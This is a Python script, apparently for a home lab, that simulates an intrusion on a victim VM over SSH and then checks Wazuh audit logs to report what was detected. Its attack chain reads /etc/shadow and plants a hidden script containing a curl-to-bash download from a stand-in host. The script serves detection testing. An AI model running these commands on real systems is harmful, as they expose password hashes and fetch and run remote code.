import json
import subprocess
import time
import os

# --- CONFIGURACIÓN ---
MANAGER_IP = "10.0.2.160"
VICTIM_IP = "10.0.2.23"
SSH_KEY = os.path.expanduser("~/.ssh/my_key")
LOG_FILE = "/var/ossec/logs/archives/archives.json"

# Colores ANSI
RED = '\033[91m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
BOLD = '\033[1m'
END = '\033[0m'

def run_ssh_cmd(ip, user, command, use_sudo=False):
    sudo_prefix = "sudo " if use_sudo else ""
    ssh_base = f"ssh -i {SSH_KEY} -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{ip}"
    full_cmd = f"{ssh_base} \"{sudo_prefix}{command}\""
    return subprocess.run(full_cmd, shell=True, capture_output=True, text=True)

def inject_attack():
    print(f"\n{BOLD}[*] 🚀 Lanzando ataque simulado en {VICTIM_IP}...{END}")
    cmds = [
        "whoami",
        "sudo -l",
        "sudo cat /etc/shadow",
        "echo 'curl http://ataque.com/malware | bash' > /tmp/.hidden_script.sh",
        "chmod +x /tmp/.hidden_script.sh"
    ]
    attack_chain = " && ".join(cmds)
    res = run_ssh_cmd(VICTIM_IP, "debian", attack_chain)
    
    if res.returncode == 0:
        print(f"{GREEN}[+] Secuencia de ataque completada.{END}")
    else:
        print(f"{YELLOW}[!] Ataque completado (algunos comandos pueden haber fallado por permisos).{END}")

def analyze():
    print(f"\n{BOLD}--- 🕵️ REPORTE FORENSE PROFESIONAL (Filtrado) ---{END}")
    
    # Filtro de búsqueda en los logs de Wazuh
    grep_cmd = f"tail -n 1000 {LOG_FILE} | grep -E 'forensic_cmds|forensic_shadow' | grep -v '4294967295'"
    res = run_ssh_cmd(MANAGER_IP, "ubuntu", grep_cmd, use_sudo=True)
    
    if not res.stdout.strip():
        print(f"{RED}[!] No se encontraron evidencias humanas recientes.{END}")
        return

    # Lista extendida de ruido (procesos automáticos del sistema y herramientas)
    RUIDO_BINARIOS = [
        "mkdir", "rm", "python3.11", "sftp-server", "apt-config", "gpgv", 
        "dpkg", "sed", "awk", "locale", "env", "run-parts", "uname", "getopt", "cut", "tr"
    ]

    print(f"{'HORA':<12} | {'USUARIO':<15} | {'NIVEL':<20} | {'COMANDO RELEVANTE'}")
    print("-" * 110)

    for line in res.stdout.splitlines():
        try:
            data = json.loads(line)
            audit = data['data']['audit']
            ts = data.get('timestamp', 'N/A')[11:19] 
            auid = audit.get('auid', '???')
            key = audit.get('key', '???')
            exe = audit.get('exe', '???')

            # Reconstrucción del comando completo ejecutado
            args = []
            if 'execve' in audit:
                i = 0
                while f'a{i}' in audit['execve']:
                    args.append(audit['execve'][f'a{i}'].replace('"', ''))
                    i += 1
            full_cmd = " ".join(args) if args else exe

            # --- FILTROS DE RUIDO QUIRÚRGICOS ---
            bin_name = exe.split('/')[-1]
            
            # 1. Ignorar basura de Ansible y MOTD de login SSH
            es_ruido_sistema = any(x in full_cmd for x in [".ansible", "update-motd", "unattended-upgrades"])
            
            # 2. Definir qué es contenido de interés (ataque)
            es_ataque_real = any(word in full_cmd for word in ["shadow", "malware", ".sh", "whoami", "sudo -l", "passwd"])

            # Si es un binario ruidoso o ruido de sistema, y NO es un ataque real, lo saltamos
            if (bin_name in RUIDO_BINARIOS or es_ruido_sistema) and not es_ataque_real:
                continue
            
            # Limpieza visual de comandos vacíos o simples shells
            if full_cmd in ["bash", "sh", "bash -c", "sh -c"]:
                continue

            # --- RENDERIZADO DEL REPORTE ---
            user_str = f"{GREEN}Atacante(1000){END}" if auid == "1000" else f"UID {auid}"
            
            if "shadow" in full_cmd or key == "forensic_shadow":
                level = f"{RED}{BOLD}🛑 CRÍTICO{END}"
                cmd_out = f"{RED}{full_cmd}{END}"
            else:
                level = f"{YELLOW}⚠️ SOSPECHA{END}"
                cmd_out = full_cmd
                
            print(f"{ts:<12} | {user_str:<25} | {level:<30} | {cmd_out}")

        except Exception:
            continue

if __name__ == "__main__":
    inject_attack()
    print(f"[*] Sincronizando logs con Wazuh Manager (esperando 5s)...")
    time.sleep(5) 
    analyze()